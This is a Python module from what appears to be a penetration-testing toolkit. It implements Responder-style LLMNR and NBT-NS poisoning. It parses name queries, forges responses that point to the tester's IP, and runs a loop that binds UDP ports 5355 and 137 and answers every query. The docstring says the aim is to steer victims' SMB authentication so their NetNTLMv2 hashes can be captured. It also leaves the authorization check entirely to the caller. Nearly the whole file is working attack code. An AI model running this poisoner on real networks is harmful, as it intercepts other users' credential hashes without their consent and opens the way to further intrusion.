"""matt.llmnr -- LLMNR / NBT-NS name-service poisoning (Responder-style).

On a Windows LAN a host that can't resolve a name by DNS falls back to shouting
the query over LLMNR (UDP 5355, multicast) and NBT-NS (UDP 137, broadcast).
Whoever answers first "is" that name. Answering those queries with the tester's
own address steers the victim's next connection -- typically an SMB auth -- to
the tester, where MATT's existing NetNTLMv2 decoder picks the hash up. This is
the same authorized-engagement primitive as the ARP poison already in MATT, and
it carries the same gate: root + written authorization, local segment only.

Standard-library only (socket, struct). The query parsers and response builders
are pure and unit-tested; poison() is the gated runtime that binds the sockets.
"""

from __future__ import annotations

import socket
import struct
import time

__all__ = [
    "parse_dns_name", "parse_llmnr_query", "build_llmnr_response",
    "decode_netbios_name", "parse_nbtns_query", "build_nbtns_response", "poison",
]

LLMNR_GROUP = "224.0.0.252"
LLMNR_PORT = 5355
NBTNS_PORT = 137


# --------------------------------------------------------------------------
# LLMNR (DNS wire format)
# --------------------------------------------------------------------------

def parse_dns_name(data: bytes, off: int):
    """Read a DNS label sequence starting at ``off``; return (name, next_off)."""
    labels = []
    while off < len(data):
        length = data[off]
        if length == 0:
            off += 1
            break
        if length & 0xC0:                 # compression pointer -- stop
            off += 2
            break
        labels.append(data[off + 1:off + 1 + length].decode("latin-1"))
        off += 1 + length
    return ".".join(labels), off


def parse_llmnr_query(data: bytes):
    """Parse an LLMNR query; return {txid, name, qend} or None (not a query)."""
    if len(data) < 12:
        return None
    flags = struct.unpack(">H", data[2:4])[0]
    if flags & 0x8000:                    # QR bit set -> it's a response
        return None
    if struct.unpack(">H", data[4:6])[0] < 1:
        return None
    name, off = parse_dns_name(data, 12)
    if not name:
        return None
    return {"txid": data[:2], "name": name, "qend": off + 4}  # +qtype +qclass


def build_llmnr_response(data: bytes, our_ip: str):
    """Craft an LLMNR answer claiming the queried name is ``our_ip``, or None."""
    q = parse_llmnr_query(data)
    if not q:
        return None
    question = data[12:q["qend"]]
    header = q["txid"] + b"\x80\x00" + b"\x00\x01\x00\x01\x00\x00\x00\x00"
    name = question[:-4]                  # labels + null, without qtype/qclass
    answer = (name + b"\x00\x01\x00\x01" + struct.pack(">I", 30)
              + b"\x00\x04" + socket.inet_aton(our_ip))
    return header + question + answer


# --------------------------------------------------------------------------
# NBT-NS (NetBIOS name service)
# --------------------------------------------------------------------------

def decode_netbios_name(encoded: bytes) -> str:
    """Undo the NetBIOS first-level (half-ASCII) name encoding."""
    out = []
    for i in range(0, min(len(encoded), 32), 2):
        hi, lo = encoded[i] - 0x41, encoded[i + 1] - 0x41
        out.append(chr((hi << 4) | lo))
    return "".join(out).split("\x00")[0].strip()


def parse_nbtns_query(data: bytes):
    """Parse an NBT-NS name query; return {txid, name, raw_name} or None."""
    if len(data) < 12 or (data[2] & 0x80):
        return None
    # question starts at 12: length byte (0x20), 32 bytes encoded name, 0x00
    if data[12] != 0x20 or len(data) < 12 + 1 + 32 + 1:
        return None
    raw_name = data[13:13 + 32]
    return {"txid": data[:2], "name": decode_netbios_name(raw_name),
            "raw_name": raw_name}


def build_nbtns_response(data: bytes, our_ip: str):
    """Craft an NBT-NS positive name-query response pointing at ``our_ip``."""
    q = parse_nbtns_query(data)
    if not q:
        return None
    header = q["txid"] + b"\x85\x00\x00\x00\x00\x01\x00\x00\x00\x00"
    rr = (b"\x20" + q["raw_name"] + b"\x00"       # name
          + b"\x00\x20\x00\x01"                   # type NB, class IN
          + struct.pack(">I", 165) + b"\x00\x06"  # ttl, rdlength
          + b"\x00\x00" + socket.inet_aton(our_ip))  # flags + address
    return header + rr


# --------------------------------------------------------------------------
# runtime (gated by the caller: root + written authorization)
# --------------------------------------------------------------------------

def poison(our_ip: str, duration: float = 30.0, on_event=None,
           sock_factory=None, select_fn=None, clock=None) -> list:
    """Answer LLMNR and NBT-NS queries with ``our_ip`` for ``duration`` seconds.

    Returns a log of poisoned queries: [{proto, name, victim, ...}]. ``on_event``
    is called per poisoned query (for live output), and ``sock_factory`` is
    injectable so tests exercise the loop without binding real sockets. The
    caller is responsible for the authorization gate -- this just runs.
    """
    log = []
    make = sock_factory or _bind_sockets
    now = clock or time.monotonic
    if select_fn is None:
        import select as _select
        select_fn = _select.select
    socks = make()
    end = now() + duration
    try:
        while now() < end:
            ready, _, _ = select_fn(list(socks), [], [], 0.5)
            for s in ready:
                try:
                    data, addr = s.recvfrom(2048)
                except OSError:
                    continue
                proto = socks[s]
                if proto == "llmnr":
                    q = parse_llmnr_query(data)
                    resp = build_llmnr_response(data, our_ip)
                else:
                    q = parse_nbtns_query(data)
                    resp = build_nbtns_response(data, our_ip)
                if q and resp:
                    try:
                        s.sendto(resp, addr)
                    except OSError:
                        pass
                    event = {"proto": proto, "name": q["name"], "victim": addr[0]}
                    log.append(event)
                    if on_event:
                        on_event(event)
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
    return log


def _bind_sockets() -> dict:
    socks = {}
    llmnr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    llmnr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    llmnr.bind(("", LLMNR_PORT))
    mreq = struct.pack("4sl", socket.inet_aton(LLMNR_GROUP), socket.INADDR_ANY)
    llmnr.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    socks[llmnr] = "llmnr"
    nbt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    nbt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        nbt.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        nbt.bind(("", NBTNS_PORT))
        socks[nbt] = "nbtns"
    except OSError:
        nbt.close()                       # 137 often held by the OS; LLMNR still works
    return socks
